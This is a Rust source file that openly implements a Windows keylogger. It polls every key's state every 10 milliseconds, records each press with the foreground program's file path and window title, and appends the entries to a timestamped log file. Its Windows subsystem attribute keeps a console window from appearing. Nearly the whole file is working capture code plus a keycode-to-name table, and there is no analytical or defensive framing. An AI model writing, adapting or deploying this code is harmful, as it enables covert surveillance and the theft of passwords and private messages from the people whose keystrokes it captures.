#![windows_subsystem = "windows"]

#[cfg(windows)]
extern crate winapi;

extern crate chrono;

use std::fs::*;
use std::io::*;
use chrono::{DateTime, Utc, Timelike};

#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::*;
    use winapi::ctypes::c_int;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use std::{thread, time::Duration};

    loop {
        thread::sleep(Duration::from_millis(10));

        let hwnd = unsafe { GetForegroundWindow() };

        let pid = unsafe {
            let mut p = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let filename = unsafe {
            const LEN: i32 = 255;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN as u32);

            //find the null terminator
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("__NO_TITLE__");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };

        let now: DateTime<Utc> = Utc::now();

        for i in 0 as c_int..255 as c_int {
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = format!("[{}:{}:{:02}][{}][{}][{}]\n",
                                now.hour(), now.minute(), now.second(),
                                filename.trim(), title.trim(), keycode_to_string(i as u8));

                #[cfg(debug_assertions)] {
                    print!("{}", s);
                }

                match file.write(s.as_bytes()) {
                    Err(e) => { println!("Couldn't write to log file: {}", e) }
                    _ => {}
                }
            }
        }
    }
}

fn keycode_to_string(k: u8) -> String {
    if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
        return format!("{}", (k as char));
    }

    match k {
        0x01 => { "VK_LBUTTON".to_string() }
        0x02 => { "VK_RBUTTON".to_string() }
        0x03 => { "VK_CANCEL".to_string() }
        0x04 => { "VK_MBUTTON".to_string() }
        0x05 => { "VK_XBUTTON1".to_string() }
        0x06 => { "VK_XBUTTON2".to_string() }
        0x08 => { "VK_BACK".to_string() }
        0x09 => { "VK_TAB".to_string() }
        0x0C => { "VK_CLEAR".to_string() }
        0x0D => { "VK_RETURN".to_string() }
        0x10 => { "VK_SHIFT".to_string() }
        0x11 => { "VK_CONTROL".to_string() }
        0x12 => { "VK_MENU".to_string() }
        0x13 => { "VK_PAUSE".to_string() }
        0x14 => { "VK_CAPITAL".to_string() }
        0x15 => { "VK_KANA,VK_HANGUEL,VK_HANGUL".to_string() }
        0x17 => { "VK_JUNJA".to_string() }
        0x18 => { "VK_FINAL".to_string() }
        0x19 => { "VK_HANJA,VK_KANJI".to_string() }
        0x1B => { "VK_ESCAPE".to_string() }
        0x1C => { "VK_CONVERT".to_string() }
        0x1D => { "VK_NONCONVERT".to_string() }
        0x1E => { "VK_ACCEPT".to_string() }
        0x1F => { "VK_MODECHANGE".to_string() }
        0x20 => { "VK_SPACE".to_string() }
        0x21 => { "VK_PRIOR".to_string() }
        0x22 => { "VK_NEXT".to_string() }
        0x23 => { "VK_END".to_string() }
        0x24 => { "VK_HOME".to_string() }
        0x25 => { "VK_LEFT".to_string() }
        0x26 => { "VK_UP".to_string() }
        0x27 => { "VK_RIGHT".to_string() }
        0x28 => { "VK_DOWN".to_string() }
        0x29 => { "VK_SELECT".to_string() }
        0x2A => { "VK_PRINT".to_string() }
        0x2B => { "VK_EXECUTE".to_string() }
        0x2C => { "VK_SNAPSHOT".to_string() }
        0x2D => { "VK_INSERT".to_string() }
        0x2E => { "VK_DELETE".to_string() }
        0x2F => { "VK_HELP".to_string() }
        0x5B => { "VK_LWIN".to_string() }
        0x5C => { "VK_RWIN".to_string() }
        0x5D => { "VK_APPS".to_string() }
        0x5F => { "VK_SLEEP".to_string() }
        0x60 => { "VK_NUMPAD0".to_string() }
        0x61 => { "VK_NUMPAD1".to_string() }
        0x62 => { "VK_NUMPAD2".to_string() }
        0x63 => { "VK_NUMPAD3".to_string() }
        0x64 => { "VK_NUMPAD4".to_string() }
        0x65 => { "VK_NUMPAD5".to_string() }
        0x66 => { "VK_NUMPAD6".to_string() }
        0x67 => { "VK_NUMPAD7".to_string() }
        0x68 => { "VK_NUMPAD8".to_string() }
        0x69 => { "VK_NUMPAD9".to_string() }
        0x6A => { "VK_MULTIPLY".to_string() }
        0x6B => { "VK_ADD".to_string() }
        0x6C => { "VK_SEPARATOR".to_string() }
        0x6D => { "VK_SUBTRACT".to_string() }
        0x6E => { "VK_DECIMAL".to_string() }
        0x6F => { "VK_DIVIDE".to_string() }
        0x70 => { "VK_F1".to_string() }
        0x71 => { "VK_F2".to_string() }
        0x72 => { "VK_F3".to_string() }
        0x73 => { "VK_F4".to_string() }
        0x74 => { "VK_F5".to_string() }
        0x75 => { "VK_F6".to_string() }
        0x76 => { "VK_F7".to_string() }
        0x77 => { "VK_F8".to_string() }
        0x78 => { "VK_F9".to_string() }
        0x79 => { "VK_F10".to_string() }
        0x7A => { "VK_F11".to_string() }
        0x7B => { "VK_F12".to_string() }
        0x7C => { "VK_F13".to_string() }
        0x7D => { "VK_F14".to_string() }
        0x7E => { "VK_F15".to_string() }
        0x7F => { "VK_F16".to_string() }
        0x80 => { "VK_F17".to_string() }
        0x81 => { "VK_F18".to_string() }
        0x82 => { "VK_F19".to_string() }
        0x83 => { "VK_F20".to_string() }
        0x84 => { "VK_F21".to_string() }
        0x85 => { "VK_F22".to_string() }
        0x86 => { "VK_F23".to_string() }
        0x87 => { "VK_F24".to_string() }
        0x90 => { "VK_NUMLOCK".to_string() }
        0x91 => { "VK_SCROLL".to_string() }
        0xA0 => { "VK_LSHIFT".to_string() }
        0xA1 => { "VK_RSHIFT".to_string() }
        0xA2 => { "VK_LCONTROL".to_string() }
        0xA3 => { "VK_RCONTROL".to_string() }
        0xA4 => { "VK_LMENU".to_string() }
        0xA5 => { "VK_RMENU".to_string() }
        0xA6 => { "VK_BROWSER_BACK".to_string() }
        0xA7 => { "VK_BROWSER_FORWARD".to_string() }
        0xA8 => { "VK_BROWSER_REFRESH".to_string() }
        0xA9 => { "VK_BROWSER_STOP".to_string() }
        0xAA => { "VK_BROWSER_SEARCH".to_string() }
        0xAB => { "VK_BROWSER_FAVORITES".to_string() }
        0xAC => { "VK_BROWSER_HOME".to_string() }
        0xAD => { "VK_VOLUME_MUTE".to_string() }
        0xAE => { "VK_VOLUME_DOWN".to_string() }
        0xAF => { "VK_VOLUME_UP".to_string() }
        0xB0 => { "VK_MEDIA_NEXT_TRACK".to_string() }
        0xB1 => { "VK_MEDIA_PREV_TRACK".to_string() }
        0xB2 => { "VK_MEDIA_STOP".to_string() }
        0xB3 => { "VK_MEDIA_PLAY_PAUSE".to_string() }
        0xB4 => { "VK_LAUNCH_MAIL".to_string() }
        0xB5 => { "VK_LAUNCH_MEDIA_SELECT".to_string() }
        0xB6 => { "VK_LAUNCH_APP1".to_string() }
        0xB7 => { "VK_LAUNCH_APP2".to_string() }
        0xBA => { "VK_OEM_1".to_string() }
        0xBB => { "VK_OEM_PLUS".to_string() }
        0xBC => { "VK_OEM_COMMA".to_string() }
        0xBD => { "VK_OEM_MINUS".to_string() }
        0xBE => { "VK_OEM_PERIOD".to_string() }
        0xBF => { "VK_OEM_2".to_string() }
        0xC0 => { "VK_OEM_3".to_string() }
        0xDB => { "VK_OEM_4".to_string() }
        0xDC => { "VK_OEM_5".to_string() }
        0xDD => { "VK_OEM_6".to_string() }
        0xDE => { "VK_OEM_7".to_string() }
        0xDF => { "VK_OEM_8".to_string() }
        0xE2 => { "VK_OEM_102".to_string() }
        0xE5 => { "VK_PROCESSKEY".to_string() }
        0xF6 => { "VK_ATTN".to_string() }
        0xF7 => { "VK_CRSEL".to_string() }
        0xF8 => { "VK_EXSEL".to_string() }
        0xF9 => { "VK_EREOF".to_string() }
        0xFA => { "VK_PLAY".to_string() }
        0xFB => { "VK_ZOOM".to_string() }
        0xFC => { "VK_NONAME".to_string() }
        0xFD => { "VK_PA1".to_string() }
        0xFE => { "VK_OEM_CLEAR".to_string() }

        _ => { return format!("CODE_{}", k); }
    }
}

#[cfg(not(windows))]
fn run(file: &mut File) {
    file.write("Can't use this windows based keylogger".as_bytes());
}

fn main() {
    let now: DateTime<Utc> = Utc::now();
    let filename = format!("log-{}-{}+{}+{}.log", now.date(), now.hour(), now.minute(), now.second());

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => { f }

            Err(e) => {
                panic!("Couldn't create Output file: {}", e);
            }
        }
    };

    run(&mut output);
}

